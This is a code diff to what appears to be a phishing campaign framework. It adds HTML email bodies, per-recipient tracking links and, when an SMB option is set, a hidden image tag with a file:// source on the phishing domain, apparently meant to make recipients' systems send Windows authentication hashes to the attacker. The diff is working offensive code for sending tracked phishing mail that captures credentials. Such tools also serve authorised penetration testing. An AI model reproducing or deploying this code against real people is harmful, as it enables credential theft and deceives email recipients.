@@ -871,6 +871,11 @@ class Framework(object):
     
                                                 SUBJECT = template.getSUBJECT()
                                                 BODY = template.getBODY()
+                                                HTML_BODY = "<html><head></head><body>"
+                                                HTML_BODY += BODY.replace('\n', '<br>')
+                                                if self.config["enable_smb_server"] == "1":
+                                                    HTML_BODY += '<br> <img src=file://' + key + "." + self.config["phishing_domain"] + '/image/sig.jpg height="100" width="150"></a>'
+                                                HTML_BODY += "</BODY></HTML>"
     
                                                 # perform necessary SEARCH/REPLACE 
                                                 if self.config["enable_host_based_vhosts"] == "1":
@@ -878,6 +883,7 @@ class Framework(object):
                                                     if self.config["enable_user_tracking"] == "1":
                                                         targetlink += "?u=" + self.db.getUserTrackId(target)
                                                     BODY=BODY.replace(r'[[TARGET]]', targetlink)
+                                                    HTML_BODY = HTML_BODY.replace(r'[[TARGET]]', '<a href="' + targetlink + '">' + targetlink + '</a>')
                                                 else:
                                                     if (not key == "dynamic"):
                                                         print key
@@ -885,6 +891,7 @@ class Framework(object):
                                                         if self.config["enable_user_tracking"] == "1":
                                                             targetlink += "?u=" + self.db.getUserTrackId(target)
                                                         BODY=BODY.replace(r'[[TARGET]]', targetlink)
+                                                        HTML_BODY = HTML_BODY.replace(r'[[TARGET]]', '<a href="' + targetlink + '">' + targetlink + '</a>')
     
                                                 # log
                                                 if (key not in templates_logged):
@@ -893,6 +900,7 @@ class Framework(object):
                                                                      "FROM: " + FROM + "\n" +
                                                                      "SUBJECT: " + SUBJECT + "\n\n" +
                                                                      BODY + "\n\n" + 
+                                                                     HTML_BODY + "\n\n" +
                                                                      "----------------------------------------------\n\n" +
                                                                      "TARGETS:\n" +
                                                                      "--------\n",
@@ -911,6 +919,7 @@ class Framework(object):
                                                                     self.config["smtp_displayname"],
                                                                     SUBJECT,
                                                                     BODY,
+                                                                    HTML_BODY,
                                                                     self.config["attachment_filename"],
                                                                     self.config["attachment_fullpath"],
                                                                     True)
@@ -925,6 +934,7 @@ class Framework(object):
                                                                     self.config["smtp_displayname"],
                                                                     SUBJECT,
                                                                     BODY,
+                                                                    HTML_BODY,
                                                                     self.config["attachment_filename"],
                                                                     self.config["attachment_fullpath"],
                                                                     True)
